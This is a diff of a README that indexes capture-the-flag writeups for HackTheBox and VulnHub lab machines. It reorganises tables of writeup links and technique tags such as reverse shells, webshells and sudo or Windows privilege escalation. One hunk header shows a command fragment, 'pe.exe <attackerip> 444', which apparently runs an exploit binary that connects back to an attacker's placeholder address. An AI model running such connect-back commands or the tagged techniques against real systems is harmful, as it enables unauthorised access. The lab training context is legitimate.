-| 5. | 10/Sep/2019 | [DC: 6](https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/killchain.png" width="100" height="100" /> |
-| 6. | 31/Aug/2019 | [Brainpan: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/writeup.pdf) |  | [`exploit_bof`](https://github.com/7h3rAm/writeups#exploit_bof), [`privesc_anansi`](https://github.com/7h3rAm/writeups#privesc_anansi), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Bashed](https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf) | [hackthebox#118](https://www.hackthebox.eu/home/machines/profile/118) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.bashed/killchain.png" width="100" height="100" /> | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs) |
+| 2. | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) | [vulnhub#205](https://www.vulnhub.com/entry/lazysysadmin-1,205/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
+| 3. | [Kioptrix: Level 1.2 (#3)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/writeup.pdf) | [vulnhub#24](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/killchain.png" width="100" height="100" /> | [`exploit_lotuscms`](https://github.com/7h3rAm/writeups#exploit_lotuscms), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
+| 4. | [FristiLeaks: 1.3](https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/writeup.pdf) | [vulnhub#133](https://www.vulnhub.com/entry/fristileaks-13,133/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
+| 5. | [DC: 6](https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf) | [vulnhub#315](https://www.vulnhub.com/entry/dc-6,315/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) |
+| 6. | [Brainpan: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/writeup.pdf) | [vulnhub#51](https://www.vulnhub.com/entry/brainpan-1,51/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/killchain.png" width="100" height="100" /> | [`exploit_bof`](https://github.com/7h3rAm/writeups#exploit_bof), [`privesc_anansi`](https://github.com/7h3rAm/writeups#privesc_anansi), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
   
   
 ---
@@ -2113,15 +2113,15 @@ using `sudo` to execute programs that run with elevated privileges
 #### privesc_sudoers [⇡](#privesc)  
 being able to edit the `/etc/sudoers` file to give a user elevated privileges  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 13/Nov/2019 | [Blocky](https://github.com/7h3rAm/writeups/blob/master/htb.blocky/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.blocky/killchain.png" width="100" height="100" /> |
-| 2. | 13/Nov/2019 | [Shocker](https://github.com/7h3rAm/writeups/blob/master/htb.shocker/writeup.pdf) |  | [`exploit_shellshock`](https://github.com/7h3rAm/writeups#exploit_shellshock), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.shocker/killchain.png" width="100" height="100" /> |
-| 3. | 12/Nov/2019 | [Mirai](https://github.com/7h3rAm/writeups/blob/master/htb.mirai/writeup.pdf) |  | [`exploit_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_defaultcreds), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.mirai/killchain.png" width="100" height="100" /> |
-| 4. | 11/Oct/2019 | [Misdirection: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf) |  | [`exploit_php_webshell`](https://github.com/7h3rAm/writeups#exploit_php_webshell), [`exploit_bash_reverseshell`](https://github.com/7h3rAm/writeups#exploit_bash_reverseshell), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_passwd_writable`](https://github.com/7h3rAm/writeups#privesc_passwd_writable) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/killchain.png" width="100" height="100" /> |
-| 5. | 29/Sep/2019 | [Kioptrix: Level 1.2 (#3)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/writeup.pdf) |  | [`exploit_lotuscms`](https://github.com/7h3rAm/writeups#exploit_lotuscms), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/killchain.png" width="100" height="100" /> |
-| 6. | 09/Sep/2019 | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) |  | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> |
-| 7. | 05/Sep/2019 | [Billy Madison: 1.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/writeup.pdf) |  | [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Blocky](https://github.com/7h3rAm/writeups/blob/master/htb.blocky/writeup.pdf) | [hackthebox#48](https://www.hackthebox.eu/home/machines/profile/48) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.blocky/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
+| 2. | [Shocker](https://github.com/7h3rAm/writeups/blob/master/htb.shocker/writeup.pdf) | [hackthebox#108](https://www.hackthebox.eu/home/machines/profile/108) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.shocker/killchain.png" width="100" height="100" /> | [`exploit_shellshock`](https://github.com/7h3rAm/writeups#exploit_shellshock), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
+| 3. | [Mirai](https://github.com/7h3rAm/writeups/blob/master/htb.mirai/writeup.pdf) | [hackthebox#64](https://www.hackthebox.eu/home/machines/profile/64) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.mirai/killchain.png" width="100" height="100" /> | [`exploit_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_defaultcreds), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
+| 4. | [Misdirection: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf) | [vulnhub#371](https://www.vulnhub.com/entry/misdirection-1,371/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/killchain.png" width="100" height="100" /> | [`exploit_php_webshell`](https://github.com/7h3rAm/writeups#exploit_php_webshell), [`exploit_bash_reverseshell`](https://github.com/7h3rAm/writeups#exploit_bash_reverseshell), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_passwd_writable`](https://github.com/7h3rAm/writeups#privesc_passwd_writable) |
+| 5. | [Kioptrix: Level 1.2 (#3)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/writeup.pdf) | [vulnhub#24](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/killchain.png" width="100" height="100" /> | [`exploit_lotuscms`](https://github.com/7h3rAm/writeups#exploit_lotuscms), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
+| 6. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [vulnhub#231](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
+| 7. | [Billy Madison: 1.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/writeup.pdf) | [vulnhub#161](https://www.vulnhub.com/entry/billy-madison-11,161/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/killchain.png" width="100" height="100" /> | [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
   
 ---
@@ -2148,27 +2148,27 @@ pe.exe <attackerip> 444
 <a name="privesc_windows_ms11_046"></a>
 #### privesc_windows_ms11_046 [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 05/Nov/2019 | [Devel](https://github.com/7h3rAm/writeups/blob/master/htb.devel/writeup.pdf) |  | [`exploit_ftp_anonymous`](https://github.com/7h3rAm/writeups#exploit_ftp_anonymous), [`exploit_ftp_web_root`](https://github.com/7h3rAm/writeups#exploit_ftp_web_root), [`exploit_iis_asp_reverseshell`](https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell), [`privesc_windows_ms11_046`](https://github.com/7h3rAm/writeups#privesc_windows_ms11_046) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.devel/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Devel](https://github.com/7h3rAm/writeups/blob/master/htb.devel/writeup.pdf) | [hackthebox#3](https://www.hackthebox.eu/home/machines/profile/3) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.devel/killchain.png" width="100" height="100" /> | [`exploit_ftp_anonymous`](https://github.com/7h3rAm/writeups#exploit_ftp_anonymous), [`exploit_ftp_web_root`](https://github.com/7h3rAm/writeups#exploit_ftp_web_root), [`exploit_iis_asp_reverseshell`](https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell), [`privesc_windows_ms11_046`](https://github.com/7h3rAm/writeups#privesc_windows_ms11_046) |
   
   
 ---
 <a name="privesc_windows_ms14_070"></a>
 #### privesc_windows_ms14_070 [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 04/Nov/2019 | [Grandpa](https://github.com/7h3rAm/writeups/blob/master/htb.grandpa/writeup.pdf) |  | [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`privesc_windows_ms14_070`](https://github.com/7h3rAm/writeups#privesc_windows_ms14_070) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.grandpa/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Grandpa](https://github.com/7h3rAm/writeups/blob/master/htb.grandpa/writeup.pdf) | [hackthebox#13](https://www.hackthebox.eu/home/machines/profile/13) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.grandpa/killchain.png" width="100" height="100" /> | [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`privesc_windows_ms14_070`](https://github.com/7h3rAm/writeups#privesc_windows_ms14_070) |
   
   
 ---
 <a name="privesc_windows_ms15_051"></a>
 #### privesc_windows_ms15_051 [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 04/Nov/2019 | [Granny](https://github.com/7h3rAm/writeups/blob/master/htb.granny/writeup.pdf) |  | [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`privesc_windows_ms15_051`](https://github.com/7h3rAm/writeups#privesc_windows_ms15_051) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.granny/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Granny](https://github.com/7h3rAm/writeups/blob/master/htb.granny/writeup.pdf) | [hackthebox#14](https://www.hackthebox.eu/home/machines/profile/14) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.granny/killchain.png" width="100" height="100" /> | [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`privesc_windows_ms15_051`](https://github.com/7h3rAm/writeups#privesc_windows_ms15_051) |
   
   
 ---
@@ -2180,9 +2180,9 @@ pe.exe <attackerip> 444
 <a name="privesc_windows_ms16_098"></a>
 #### privesc_windows_ms16_098 [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 04/Nov/2019 | [Optimum](https://github.com/7h3rAm/writeups/blob/master/htb.optimum/writeup.pdf) |  | [`exploit_hfs_cmd_exec`](https://github.com/7h3rAm/writeups#exploit_hfs_cmd_exec), [`privesc_windows_ms16_098`](https://github.com/7h3rAm/writeups#privesc_windows_ms16_098) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.optimum/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Optimum](https://github.com/7h3rAm/writeups/blob/master/htb.optimum/writeup.pdf) | [hackthebox#6](https://www.hackthebox.eu/home/machines/profile/6) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.optimum/killchain.png" width="100" height="100" /> | [`exploit_hfs_cmd_exec`](https://github.com/7h3rAm/writeups#exploit_hfs_cmd_exec), [`privesc_windows_ms16_098`](https://github.com/7h3rAm/writeups#privesc_windows_ms16_098) |
   
   
 ---
